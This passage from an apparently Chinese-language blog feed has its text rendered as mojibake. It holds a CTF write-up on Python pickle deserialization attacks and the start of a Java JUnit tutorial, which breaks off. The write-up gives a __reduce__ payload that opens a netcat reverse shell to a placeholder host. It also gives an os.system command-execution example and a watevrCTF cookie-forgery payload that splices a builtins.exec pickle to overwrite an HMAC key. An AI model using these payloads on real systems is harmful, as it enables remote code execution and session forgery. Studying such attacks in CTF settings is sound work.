title="æµç¨‹"></a>æµç¨‹</h4><ul><li><p><code>PVM</code>ä¼šæŠŠæºä»£ç ç¼–è¯‘æˆå­—èŠ‚ç </p><blockquote><p>å­—èŠ‚ç æ˜¯Pythonç‰¹æœ‰çš„ä¸€ç§è¡¨ç°å½¢å¼ï¼Œä¸æ˜¯äºŒè¿›åˆ¶æœºå™¨ç ï¼Œéœ€è¦è¿›ä¸€æ­¥ç¼–è¯‘æ‰èƒ½è¢«æœºå™¨æ‰§è¡Œ . å¦‚æœ Python è¿›ç¨‹åœ¨ä¸»æœºä¸Šæœ‰å†™å…¥æƒé™ , é‚£ä¹ˆå®ƒä¼šæŠŠç¨‹åºå­—èŠ‚ç ä¿å­˜ä¸ºä¸€ä¸ªä»¥ .pyc ä¸ºæ‰©å±•åçš„æ–‡ä»¶ . å¦‚æœæ²¡æœ‰å†™å…¥æƒé™ , åˆ™ Python è¿›ç¨‹ä¼šåœ¨å†…å­˜ä¸­ç”Ÿæˆå­—èŠ‚ç  , åœ¨ç¨‹åºæ‰§è¡Œç»“æŸåè¢«è‡ªåŠ¨ä¸¢å¼ƒ .</p></blockquote></li><li><p><code>Python</code>è¿›ç¨‹ä¼šæŠŠç¼–è¯‘å¥½çš„å­—èŠ‚ç è½¬å‘åˆ°<code>PVMï¼ˆPythonè™šæ‹Ÿæœºï¼‰</code>ä¸­ï¼Œ<code>PVM</code>ä¼šå¾ªç¯è¿­ä»£æ‰§è¡Œå­—èŠ‚ç æŒ‡ä»¤ï¼Œç›´åˆ°æ‰€æœ‰æ“ä½œè¢«å®Œæˆã€‚</p></li></ul><h4 id="PVMä¸Pickleæ¨¡å—çš„å…³ç³»"><a href="#PVMä¸Pickleæ¨¡å—çš„å…³ç³»" class="headerlink" title="PVMä¸Pickleæ¨¡å—çš„å…³ç³»"></a>PVMä¸Pickleæ¨¡å—çš„å…³ç³»</h4><blockquote><p>Pickleæ˜¯ä¸€é—¨åŸºäºæ ˆçš„ç¼–ç¨‹è¯­è¨€ , æœ‰ä¸åŒçš„ç¼–å†™æ–¹å¼ , å…¶æœ¬è´¨å°±æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ PVM .</p><p>ç”±ä¸‰éƒ¨åˆ†ç»„æˆ</p><ul><li>æŒ‡ä»¤å¤„ç†å™¨( Instruction processor )</li><li>æ ˆåŒº( stack )</li><li>æ ‡ç­¾åŒº( memo )</li></ul></blockquote><h4 id="æŒ‡ä»¤å¤„ç†å™¨å¯è¯»çš„æ“ä½œç "><a href="#æŒ‡ä»¤å¤„ç†å™¨å¯è¯»çš„æ“ä½œç " class="headerlink" title="æŒ‡ä»¤å¤„ç†å™¨å¯è¯»çš„æ“ä½œç "></a>æŒ‡ä»¤å¤„ç†å™¨å¯è¯»çš„æ“ä½œç </h4><ol><li><code>c</code>: è¯»å–æœ¬è¡Œçš„å†…å®¹ä½œä¸ºæ¨¡å—å<code>module</code>, è¯»å–ä¸‹ä¸€è¡Œçš„å†…å®¹ä½œä¸ºå¯¹è±¡å<code>object</code>ï¼Œç„¶åå°† <code>module.object</code>ä½œä¸ºå¯è°ƒç”¨å¯¹è±¡å‹å…¥åˆ°æ ˆä¸­</li><li><code>(</code>: å°†ä¸€ä¸ªæ ‡è®°å¯¹è±¡å‹å…¥åˆ°æ ˆä¸­ , ç”¨äºç¡®å®šå‘½ä»¤æ‰§è¡Œçš„ä½ç½® . è¯¥æ ‡è®°å¸¸å¸¸æ­é… t æŒ‡ä»¤ä¸€èµ·ä½¿ç”¨ , ä»¥ä¾¿äº§ç”Ÿä¸€ä¸ªå…ƒç»„</li><li><code>S</code>: åé¢è·Ÿå­—ç¬¦ä¸² , PVMä¼šè¯»å–å¼•å·ä¸­çš„å†…å®¹ , ç›´åˆ°é‡è§æ¢è¡Œç¬¦ , ç„¶åå°†è¯»å–åˆ°çš„å†…å®¹å‹å…¥åˆ°æ ˆä¸­</li><li><code>t</code>: ä»æ ˆä¸­ä¸æ–­å¼¹å‡ºæ•°æ® , å¼¹å°„é¡ºåºä¸å‹æ ˆæ—¶ç›¸åŒ , ç›´åˆ°å¼¹å‡ºå·¦æ‹¬å· . æ­¤æ—¶å¼¹å‡ºçš„å†…å®¹å½¢æˆäº†ä¸€ä¸ªå…ƒç»„ , ç„¶å , è¯¥å…ƒç»„ä¼šè¢«å‹å…¥æ ˆä¸­</li><li><code>R</code>: å°†ä¹‹å‰å‹å…¥æ ˆä¸­çš„å…ƒç»„å’Œå¯è°ƒç”¨å¯¹è±¡å…¨éƒ¨å¼¹å‡º , ç„¶åå°†è¯¥å…ƒç»„ä½œä¸ºå¯è°ƒç”¨å‚æ•°çš„å¯¹è±¡å¹¶æ‰§è¡Œè¯¥å¯¹è±¡ ã€‚æœ€åå°†ç»“æœå‹å…¥åˆ°æ ˆä¸­</li><li><code>.</code>: ç»“æŸæ•´ä¸ª <code>Pickle</code>ååºåˆ—åŒ–è¿‡ç¨‹</li></ol><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="reduce-é­”æœ¯æ–¹æ³•"><a href="#reduce-é­”æœ¯æ–¹æ³•" class="headerlink" title="__reduce__é­”æœ¯æ–¹æ³•"></a><code>__reduce__é­”æœ¯æ–¹æ³•</code></h3><p>ååºåˆ—åŒ–æ¼æ´å‡ºç°åœ¨ <code>__reduce__()</code>é­”æ³•å‡½æ•°ä¸Šï¼Œè¿™ä¸€ç‚¹å’ŒPHPä¸­çš„<code>__wakeup()</code>é­”æœ¯æ–¹æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯å› ä¸ºæ¯å½“ååºåˆ—åŒ–è¿‡ç¨‹å¼€å§‹æˆ–è€…ç»“æŸæ—¶ , éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ç±»å‡½æ•°ã€‚è€Œè¿™æ°å¥½æ˜¯ååºåˆ—åŒ–æ¼æ´ç»å¸¸å‡ºç°çš„åœ°æ–¹ã€‚ç»å¸¸æ„é€ ä¸€ä¸ªç±»ï¼Œåœ¨è¯¥é­”æœ¯æ–¹æ³•ä¸­åŠ å…¥å±é™©å‡½æ•°</p><p>å¦å¤–<code>pickle.loads</code>ä¼šè§£å†³<code>import</code>é—®é¢˜ï¼Œå¯¹äºæœªå¼•å…¥çš„<code>module</code>ä¼šè‡ªåŠ¨å°è¯•<code>import</code>ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´æ•´ä¸ªpythonæ ‡å‡†åº“çš„ä»£ç æ‰§è¡Œã€å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½å¯ä»¥è¿›è¡Œä½¿ç”¨</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc vpsip port -e/bin/sh&#x27;)&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(a))</span><br></pre></td></tr></table></figure></div><blockquote><p>å½“ <code>__reduce__()</code>å‡½æ•°è¿”å›ä¸€ä¸ªå…ƒç»„æ—¶ , <strong>ç¬¬ä¸€ä¸ªå…ƒç´ </strong>æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ , è¿™ä¸ªå¯¹è±¡ä¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶è¢«è°ƒç”¨ . <strong>ç¬¬äºŒä¸ªå…ƒç´ </strong>æ˜¯å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•° , åŒæ ·æ˜¯ä¸€ä¸ªå…ƒç»„ã€‚è¿™ç‚¹è·Ÿæˆ‘ä»¬ä¸Šé¢æåˆ°çš„PVMä¸­çš„<code>R</code>æ“ä½œç åŠŸèƒ½ç›¸ä¼¼ï¼Œå¯ä»¥å¯¹æ¯”ä¸‹ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å°†ä¹‹å‰å‹å…¥æ ˆä¸­çš„å…ƒç»„å’Œå¯è°ƒç”¨å¯¹è±¡å…¨éƒ¨å¼¹å‡º , ç„¶åå°†è¯¥å…ƒç»„ä½œä¸ºå¯è°ƒç”¨å‚æ•°çš„å¯¹è±¡å¹¶æ‰§è¡Œè¯¥å¯¹è±¡ ã€‚æœ€åå°†ç»“æœå‹å…¥åˆ°æ ˆä¸­ </span><br></pre></td></tr></table></figure></div><p>âš ï¸ï¼šåœ¨python2ä¸­åªæœ‰å†…ç½®ç±»æ‰æœ‰<code>__reduce__</code>æ–¹æ³•ï¼Œå³ç”¨<code>class A(object)</code>å£°æ˜çš„ç±»ï¼Œè€Œ<code>python3</code>ä¸­å·²ç»é»˜è®¤éƒ½æ˜¯å†…ç½®ç±»äº†</p></blockquote><h3 id="å¯èƒ½å‡ºç°çš„ä½ç½®"><a href="#å¯èƒ½å‡ºç°çš„ä½ç½®" class="headerlink" title="å¯èƒ½å‡ºç°çš„ä½ç½®"></a>å¯èƒ½å‡ºç°çš„ä½ç½®</h3><ol><li>è§£æè®¤è¯tokenã€sessionçš„æ—¶å€™</li><li>å°†å¯¹è±¡Pickleåå­˜å‚¨æˆç£ç›˜æ–‡ä»¶</li><li>å°†å¯¹è±¡Pickleååœ¨ç½‘ç»œä¸­ä¼ è¾“</li><li>å‚æ•°ä¼ é€’ç»™ç¨‹åº</li></ol><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a><strong>å‘½ä»¤æ‰§è¡Œ</strong></h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ¨¡ä»¿Epicccalå¸ˆå‚…çš„ä¾‹å­</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test2</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment">#è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•°</span></span><br><span class="line">        cmd = <span class="string">&quot;/usr/bin/id&quot;</span> </span><br><span class="line">        <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test = Test2()</span><br><span class="line">    <span class="comment">#æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ</span></span><br><span class="line">    result1 = pickle.dumps(test)</span><br><span class="line">    <span class="comment">#æ‰§è¡Œååºåˆ—åŒ–æ“ä½œ</span></span><br><span class="line">    result2 = pickle.loads(result1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __reduce__()é­”æ³•æ–¹æ³•çš„è¿”å›å€¼:</span></span><br><span class="line"><span class="comment"># return(os.system,(cmd,))</span></span><br><span class="line"><span class="comment"># 1.æ»¡è¶³è¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œå…ƒç»„ä¸­æœ‰ä¸¤ä¸ªå‚æ•°</span></span><br><span class="line"><span class="comment"># 2.ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨å‡½æ•° : os.system()</span></span><br><span class="line"><span class="comment"># 3.ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå…ƒç»„:(cmd,),å…ƒç»„ä¸­è¢«è°ƒç”¨çš„å‚æ•° cmd</span></span><br><span class="line"><span class="comment"># 4. å› æ­¤åºåˆ—åŒ–æ—¶è¢«è§£ææ‰§è¡Œçš„ä»£ç æ˜¯ os.system(&quot;/usr/bin/id&quot;)</span></span><br></pre></td></tr></table></figure></div><blockquote><ul><li>os.systemå’Œos.popen</li></ul><p>os.system è°ƒç”¨ç³»ç»Ÿå‘½ä»¤ï¼Œå®Œæˆåé€€å‡ºï¼Œè¿”å›ç»“æœæ˜¯å‘½ä»¤æ‰§è¡ŒçŠ¶æ€ï¼Œä¸€èˆ¬æ˜¯0 os.popen() æ— æ³•è¯»å–ç¨‹åºæ‰§è¡Œçš„è¿”å›å€¼,å¯ä»¥ä½¿ç”¨<code>commands.getoutput()</code>è¿™ä¸ªå‡½æ•°(å›æ˜¾ç»“æœ)æ¥è¿›è¡Œä»£æ›¿ï¼Œæ„é€ payload</p></blockquote><h3 id="æ‹¼æ¥è¦†ç›–key-ä¼ªé€ cookie"><a href="#æ‹¼æ¥è¦†ç›–key-ä¼ªé€ cookie" class="headerlink" title="æ‹¼æ¥è¦†ç›–key,ä¼ªé€ cookie"></a>æ‹¼æ¥è¦†ç›–key,ä¼ªé€ cookie</h3><p>[watevrCTF-2019]Pickle Store</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>è®¾ç½®ä½™é¢ä¸º10000</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"></span><br><span class="line">key=<span class="string">b&#x27;66666666666666666666666666666666&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;money&quot;</span>:<span class="number">10000</span>,<span class="string">&quot;history&quot;</span>:[]&#125;</span><br><span class="line">h = hmac.new(key)</span><br><span class="line">h.update(<span class="built_in">str</span>(cookies).encode())</span><br><span class="line">cookies[<span class="string">&quot;anti_tamper_hmac&quot;</span>] = h.digest().<span class="built_in">hex</span>()</span><br><span class="line">result2 = pickle.dumps(cookies)</span><br><span class="line"><span class="built_in">print</span>(result2)</span><br></pre></td></tr></table></figure></div><p>è¾“å‡º</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x80\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#x27;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&quot;</span><br></pre></td></tr></table></figure></div><blockquote><p>ä½†æ˜¯keyçš„è¦†ç›–åªåœ¨å› æ­¤è¯·æ±‚ä¸­ç”Ÿæ•ˆï¼Œä¼ªé€ çš„cookieä¹Ÿå¿…é¡»ä¸€èµ·å‘é€ï¼Œè¿™æ—¶å€™å°±è¦æ‹¼æ¥ä¸¤ä¸ªæ“ä½œï¼ŒæŠŠç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„.å»æ‰ï¼ŒæŠŠç¬¬äºŒä¸ªpickleå¼€å¤´çš„ç‰ˆæœ¬å£°æ˜å»æ‰ï¼Œå°†ä¸¤è€…æ‹¼æ¥</p></blockquote><p>ç¬¬äºŒä¸ªpickleæµï¼š<br><code>b&quot;\x80\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#39;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&quot;</code></p><p>æ‹¼æ¥å</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x80\x03cbuiltins\nexec\nq\x00X4\x00\x00\x00global key;key = b&#x27;66666666666666666666666666666666&#x27;q\x01\x85q\x02Rq\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#x27;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&quot;</span><br></pre></td></tr></table></figure></div><p>base64ç¼–ç å,æ³¨æ„è¦ç”¨pythonè„šæœ¬ï¼Œå› ä¸ºpythonä¸­å­—ç¬¦ä¸²<strong>b å‰ç¼€ä»£è¡¨çš„å°±æ˜¯bytes</strong> </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gANjYnVpbHRpbnMKZXhlYwpxAFg0AAAAZ2xvYmFsIGtleTtrZXkgPSBiJzY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2J3EBhXECUnEDfXEAKFgFAAAAbW9uZXlxAU0QJ1gHAAAAaGlzdG9yeXECXXEDWBAAAABhbnRpX3RhbXBlcl9obWFjcQRYIAAAAGNjYjQ4N2VlYzFjYjY2ZGRhOGQwMGE4MTIxYWViNGJmcQV1Lg==</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Webå­¦ä¹ </title>
      <link href="/2022/07/20/Java-Web%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/07/20/Java-Web%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA-WEBå­¦ä¹ "><a href="#JAVA-WEBå­¦ä¹ " class="headerlink" title="JAVA WEBå­¦ä¹ "></a>JAVA WEBå­¦ä¹ </h1><h2 id="Junit-å•å…ƒæµ‹è¯•"><a href="#Junit-å•å…ƒæµ‹è¯•" class="headerlink" title="Junit å•å…ƒæµ‹è¯•"></a>Junit å•å…ƒæµ‹è¯•</h2><h3 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h3><h4 id="0x01-å®šä¹‰ä¸€ä¸ªæµ‹è¯•ç±»"><a href="#0x01-å®šä¹‰ä¸€ä¸ªæµ‹è¯•ç±»" class="headerlink" title="0x01 å®šä¹‰ä¸€ä¸ªæµ‹è¯•ç±»"></a>0x01 å®šä¹‰ä¸€ä¸ªæµ‹è¯•ç±»</h4><p>å»ºè®®ï¼š</p><p>æµ‹è¯•ç±»åï¼šè¢«æµ‹è¯•çš„ç±»å+Test  e.g. CalculatorTest </p><p>åŒ…åï¼šxxx.xxx.xx.test      e.g. cn.itcast.test</p><h4 id="0x02-å®šä¹‰æµ‹è¯•æ–¹æ³•-å¯ä»¥ç‹¬ç«‹è¿è¡Œ"><a href="#0x02-å®šä¹‰æµ‹è¯•æ–¹æ³•-å¯ä»¥ç‹¬ç«‹è¿è¡Œ" class="headerlink" title="0x02 å®šä¹‰æµ‹è¯•æ–¹æ³•:å¯ä»¥ç‹¬ç«‹è¿è¡Œ"></a>0x02 å®šä¹‰æµ‹è¯•æ–¹æ³•:å¯ä»¥ç‹¬ç«‹è¿è¡Œ</h4><p>å»ºè®®</p><p>æ–¹æ³•åï¼štest+æµ‹è¯•çš„æ–¹æ³•å testAdd()</p><p>è¿”å›å€¼: void</p><p>å‚æ•°åˆ—è¡¨ï¼šç©ºå‚</p><h4 id="0x03-å¯¼å…¥junitä¾èµ–ç¯å¢ƒ"><a href="#0x03-å¯¼å…¥junitä¾èµ–ç¯å¢ƒ" class="headerlink" title="0x03 å¯¼å…¥junitä¾èµ–ç¯å¢ƒ"></a>0x03 å¯¼å…¥junitä¾èµ–ç¯å¢ƒ</h4><h4 id="0x04-ç»™æ–¹æ³•åŠ æ³¨è§£-Testä½¿å…¶èƒ½ç‹¬ç«‹è¿è¡Œ"><a href="#0x04-ç»™æ–¹æ³•åŠ æ³¨è§£-Testä½¿å…¶èƒ½ç‹¬ç«‹è¿è¡Œ" class="headerlink" title="0x04 ç»™æ–¹æ³•åŠ æ³¨è§£@Testä½¿å…¶èƒ½ç‹¬ç«‹è¿è¡Œ"></a>0x04 ç»™æ–¹æ³•åŠ æ³¨è§£@Testä½¿å…¶èƒ½ç‹¬ç«‹è¿è¡Œ</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalculatorTest</span> &#123;</span><br><span class="line">    <span class="comment">//è‡ªå®šä¹‰åˆå§‹åŒ–æ–¹æ³•ï¼Œç”¨äºèµ„æºç”³è¯·ï¼Œæ‰€æœ‰æµ‹è¯•æ–¹æ³•åœ¨æ‰§è¡Œå‰éƒ½å…ˆæ‰§è¡Œè¿™ä¸ªæ–¹æ³•ï¼ˆåŠ æ³¨è§£@Beforeå®ç°ï¼‰</span></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init..&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//é‡Šæ”¾èµ„æºæ–¹æ³•ï¼Œæ‰€æœ‰æµ‹è¯•æ–¹æ³•æ‰§è¡Œå®Œåè‡ªåŠ¨æ‰§è¡Œï¼ˆåŠ æ³¨è§£@Afterå®ç°ï¼‰</span></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;close..&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æµ‹è¯•addæ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testAdd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//System.out.println(&quot;è¢«æ‰§è¡Œ&quot;);</span></span><br><span class="line">        <span class="comment">//åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">        Calculator c=<span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">        <span class="type">int</span> res=c.add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">        <span class="comment">//æ–­è¨€åˆ¤æ–­æ–¹æ³•è¾“å‡º</span></span><br><span class="line">        Assert.assertEquals(<span class="number">3</span>,res);<span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æœŸæœ›è¾“å‡ºå€¼ï¼Œè‹¥ä¸ä¸€æ ·ä¼šæŠ¥é”™</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>æ·»åŠ æ–­è¨€æ“ä½œå¤„ç†ç»“æœ</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ–­è¨€åˆ¤æ–­æ–¹æ³•è¾“å‡º</span></span><br><span class="line">Assert.assertEquals(<span class="number">3</span>,res);<span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æœŸæœ›è¾“å‡ºå€¼ï¼Œè‹¥ä¸ä¸€æ ·ä¼šæŠ¥é”™</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="Before-After"><a href="#Before-After" class="headerlink" title="@Before @After"></a>@Before @After</h3><p>ç‰¹æ®Šæ³¨è§£ï¼Œç”¨äºæŒ‡å®šåˆå§‹åŒ–æ–¹æ³•ä¸é‡Šæ”¾èµ„æºæ–¹æ³•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è‡ªå®šä¹‰åˆå§‹åŒ–æ–¹æ³•ï¼Œç”¨äºèµ„æºç”³è¯·ï¼Œæ‰€æœ‰æµ‹è¯•æ–¹æ³•åœ¨æ‰§è¡Œå‰éƒ½å…ˆæ‰§è¡Œè¿™ä¸ªæ–¹æ³•ï¼ˆåŠ æ³¨è§£@Beforeå®ç°ï¼‰</span></span><br><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;init..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//é‡Šæ”¾èµ„æºæ–¹æ³•ï¼Œæ‰€æœ‰æµ‹è¯•æ–¹æ³•æ‰§è¡Œå®Œåè‡ªåŠ¨æ‰§è¡Œï¼ˆåŠ æ³¨è§£@Afterå®ç°ï¼‰</span></span><br><span class="line"><span class="meta">@After</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;close..&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>å³ä½¿æµ‹è¯•æ–¹æ³•ä¸­æœ‰æŠ¥é”™ï¼ˆå¦‚æ–­è¨€æŠ¥é”™ç­‰ï¼‰ä»ä¼šæ‰§è¡Œ@Afteråæ–¹æ³•</p></blockquote><h2 id="æ³¨è§£"><a href="#æ³¨è§£" class="headerlink" title="æ³¨è§£"></a>æ³¨è§£</h2><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>ä»£ç çº§åˆ«çš„è¯´æ˜ï¼Œç»™è®¡ç®—æœºçœ‹çš„ï¼ŒJDK1.5åæ–°ç‰¹æ€§ï¼Œä¸€èˆ¬æ ¼å¼ï¼š<code>@æ³¨è§£åç§°</code></p><h3 id="é¢„å®šä¹‰æ³¨è§£"><a href="#é¢„å®šä¹‰æ³¨è§£" class="headerlink" title="é¢„å®šä¹‰æ³¨è§£"></a>é¢„å®šä¹‰æ³¨è§£</h3><ul><li>@Override :æ£€æµ‹è¯¥æ³¨è§£æ ‡æ³¨çš„æ–¹æ³•æ˜¯å¦æ˜¯ç»§æ‰¿è‡ªçˆ¶ç±»æˆ–çˆ¶æ¥å£</li><li>@Deprecated ï¼šå°†è¯¥æ³¨è§£æ ‡æ³¨çš„å†…å®¹ï¼Œå·²è¿‡æ—¶</li><li>@SuppressWarnings ï¼šå‹åˆ¶è­¦å‘Š ï¼ˆå¯ä»¥æ”¾åœ¨ç±»çš„å‰é¢ï¼Œå‹åˆ¶å…¶æ‰€æœ‰è­¦å‘Šï¼‰</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é¢„å®šä¹‰æ³¨è§£</span></span><br><span class="line"><span class="meta">@Override</span><span class="comment">//æ£€æµ‹é‡å†™çˆ¶ç±»/çˆ¶ç«¯å£æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span 